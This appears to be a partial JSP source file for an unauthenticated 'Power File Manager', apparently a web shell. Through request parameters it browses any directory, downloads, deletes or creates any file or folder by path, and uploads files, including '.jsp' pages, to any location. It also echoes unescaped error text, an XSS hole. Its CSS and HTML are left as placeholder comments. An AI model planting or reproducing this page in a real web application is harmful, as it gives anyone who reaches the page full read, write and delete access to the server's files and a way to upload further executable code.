<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="org.apache.commons.fileupload.*" %>
<%@ page import="org.apache.commons.fileupload.disk.*" %>
<%@ page import="org.apache.commons.fileupload.servlet.*" %>
<%@ page errorPage="error.jsp" %>

<%!
    // Configuration
    private static final String[] ALLOWED_UPLOAD_EXTENSIONS = {".txt", ".log", ".jsp", ".html", ".css", ".js", ".jpg", ".png", ".gif"};
    private static final long MAX_UPLOAD_SIZE = 10 * 1024 * 1024; // 10MB
    
    private boolean isAllowedExtension(String filename) {
        try {
            if (filename == null) return false;
            String lowerFilename = filename.toLowerCase();
            for (String ext : ALLOWED_UPLOAD_EXTENSIONS) {
                if (lowerFilename.endsWith(ext)) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }
    
    private String formatFileSize(long size) {
        try {
            if (size <= 0) return "0 B";
            String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
            int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
            return String.format("%,.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
        } catch (Exception e) {
            return size + " B";
        }
    }
%>

<%
    String errorMessage = null;
    
    try {
        // Handle file upload
        if ("POST".equalsIgnoreCase(request.getMethod()) && 
            ServletFileUpload.isMultipartContent(request)) {
            
            DiskFileItemFactory factory = new DiskFileItemFactory();
            factory.setSizeThreshold(4096);
            factory.setRepository(new File(System.getProperty("java.io.tmpdir")));
            
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setSizeMax(MAX_UPLOAD_SIZE);
            
            String uploadPath = request.getParameter("uploadPath");
            if (uploadPath == null || uploadPath.trim().isEmpty()) {
                uploadPath = System.getProperty("user.dir");
            }
            
            try {
                List<FileItem> items = upload.parseRequest(request);
                for (FileItem item : items) {
                    if (!item.isFormField() && item.getSize() > 0) {
                        String fileName = new File(item.getName()).getName();
                        if (isAllowedExtension(fileName)) {
                            File storeFile = new File(uploadPath, fileName);
                            item.write(storeFile);
                        } else {
                            errorMessage = "File type not allowed: " + fileName;
                        }
                    }
                }
            } catch (Exception ex) {
                errorMessage = "Upload failed: " + ex.getMessage();
            }
        }

        // Handle file operations
        String path = request.getParameter("path");
        if (path == null || path.trim().isEmpty()) {
            path = System.getProperty("user.dir");
        }

        File currentDir = new File(path);
        if (!currentDir.exists()) {
            currentDir = new File(System.getProperty("user.dir"));
            errorMessage = "Path not found, defaulting to: " + currentDir.getAbsolutePath();
        }

        // Handle file deletion
        String delFile = request.getParameter("delete");
        if (delFile != null && !delFile.trim().isEmpty()) {
            File f = new File(delFile);
            if (f.exists()) {
                try {
                    if (f.delete()) {
                        request.setAttribute("operationMessage", "<span style='color:#0f0'>Deleted: " + f.getAbsolutePath() + "</span>");
                    } else {
                        errorMessage = "Failed to delete: " + f.getAbsolutePath();
                    }
                } catch (SecurityException se) {
                    errorMessage = "Permission denied: " + se.getMessage();
                }
            }
        }

        // Handle directory creation
        String newDir = request.getParameter("newDir");
        if (newDir != null && !newDir.trim().isEmpty()) {
            File dir = new File(currentDir, newDir);
            try {
                if (dir.mkdir()) {
                    request.setAttribute("operationMessage", "<span style='color:#0f0'>Created directory: " + dir.getAbsolutePath() + "</span>");
                } else {
                    errorMessage = "Failed to create directory: " + dir.getAbsolutePath();
                }
            } catch (SecurityException se) {
                errorMessage = "Permission denied: " + se.getMessage();
            }
        }

        // Handle file download
        String downloadFile = request.getParameter("download");
        if (downloadFile != null && !downloadFile.trim().isEmpty()) {
            File f = new File(downloadFile);
            if (f.exists() && f.isFile()) {
                try {
                    response.setContentType("application/octet-stream");
                    response.setHeader("Content-Disposition", "attachment; filename=\"" + f.getName() + "\"");
                    Files.copy(f.toPath(), response.getOutputStream());
                    response.getOutputStream().flush();
                    return;
                } catch (IOException ioe) {
                    errorMessage = "Download failed: " + ioe.getMessage();
                }
            }
        }

        File[] filesList = currentDir.listFiles();
        if (filesList == null) filesList = new File[0];
        
        // Sort files
        Arrays.sort(filesList, (f1, f2) -> {
            try {
                if (f1.isDirectory() && !f2.isDirectory()) return -1;
                if (!f1.isDirectory() && f2.isDirectory()) return 1;
                return f1.getName().compareToIgnoreCase(f2.getName());
            } catch (Exception e) {
                return 0;
            }
        });

%>

<!DOCTYPE html>
<html>
<head>
    <title>Power File Manager</title>
    <style>
        /* [Previous CSS styles remain the same] */
        .error-message {
            background-color: #300;
            color: #fff;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #f00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Power File Manager</h1>
        
        <% if (errorMessage != null) { %>
            <div class="error-message">Error: <%= errorMessage %></div>
        <% } %>
        
        <% if (request.getAttribute("operationMessage") != null) { %>
            <div class="operation-panel"><%= request.getAttribute("operationMessage") %></div>
        <% } %>
        
        <!-- [Rest of the HTML remains the same] -->
        
    </div>
</body>
</html>

<%
    } catch (Exception e) {
        errorMessage = "System error: " + e.getMessage();
%>
    <div class="container">
        <h1>Error in File Manager</h1>
        <div class="error-message">
            <%= errorMessage %>
        </div>
        <p>Please try again or contact support.</p>
    </div>
<%
    }
%>
